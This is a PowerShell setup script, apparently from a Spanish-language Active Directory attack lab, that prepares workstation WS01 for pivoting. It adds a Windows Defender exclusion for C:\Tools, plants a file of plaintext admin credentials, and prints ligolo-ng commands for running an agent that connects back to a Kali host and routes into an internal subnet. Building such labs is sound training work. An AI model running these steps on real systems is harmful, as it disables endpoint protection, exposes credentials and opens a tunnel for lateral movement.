Write-Host "============================================" -ForegroundColor Yellow
Write-Host "  AD Attack Lab - WS01 / 03_ligolo_prep.ps1" -ForegroundColor Yellow
Write-Host "  Solo para uso en laboratorio controlado" -ForegroundColor Yellow
Write-Host "============================================" -ForegroundColor Yellow

Write-Host "`n[BLOQUE 3] Preparando WS01 para pivoting con ligolo-ng..." -ForegroundColor Cyan

New-Item -ItemType Directory -Path "C:\Tools" -Force | Out-Null
Write-Host "[+] Carpeta C:\Tools creada (drop zone para ligolo agent)" -ForegroundColor Green

Add-MpPreference -ExclusionPath "C:\Tools"
Write-Host "[!] MISCONFIGURACION: Defender excluye C:\Tools (lab only)" -ForegroundColor Red

$CredsContent = "# admin_notes.txt`r`n# Acceso temporal para soporte IT`r`n`r`nWS01 local admin: j.smith / Password123!`r`nDC01 admin: Administrator / Admin123!`r`nAcceso FILE01: svc_backup / Backup2024!"

$CredsContent | Out-File "C:\Users\Public\admin_notes.txt" -Encoding UTF8
Write-Host "[!] LOOT PLANTADO: C:\Users\Public\admin_notes.txt (credenciales en texto claro)" -ForegroundColor Red

Write-Host ""
Write-Host "[+] WS01 listo para recibir ligolo-ng agent" -ForegroundColor Green
Write-Host ""
Write-Host "Flujo de pivoting desde Kali:" -ForegroundColor White
Write-Host "  ./ligolo-proxy -selfcert -laddr 0.0.0.0:11601" -ForegroundColor Gray
Write-Host "  upload ligolo-agent.exe C:\Tools\agent.exe" -ForegroundColor Gray
Write-Host "  C:\Tools\agent.exe -connect 192.168.1.X:11601 -ignore-cert" -ForegroundColor Gray
Write-Host "  session -> start" -ForegroundColor Gray
Write-Host "  ip route add 10.10.10.0/24 dev ligolo" -ForegroundColor Gray
Write-Host ""
Write-Host "Siguiente paso: correr 04_network_misconfigs.ps1" -ForegroundColor Cyan
